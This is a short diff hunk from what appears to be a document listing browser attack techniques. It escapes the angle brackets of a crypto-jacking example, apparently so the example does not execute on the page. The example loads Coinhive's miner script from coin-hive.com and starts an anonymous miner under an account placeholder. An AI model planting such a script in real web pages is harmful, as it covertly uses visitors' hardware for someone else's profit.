@@ -515,11 +515,11 @@ stream = await navigator.mediaDevices.getUserMedia(constraints);
 
 Crypto-jacking:
 ```javascript
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
+&#x003C;script src="https://coin-hive.com/lib/coinhive.min.js"&#x003E;&#x003C;/script&#x003E;
+&#x003C;script&#x003E;
   var miner = new CoinHive.Anonymous('<my account id>');
   miner.start();
-</script>
+&#x003C;/script&#x003E;
 ```
 
 --
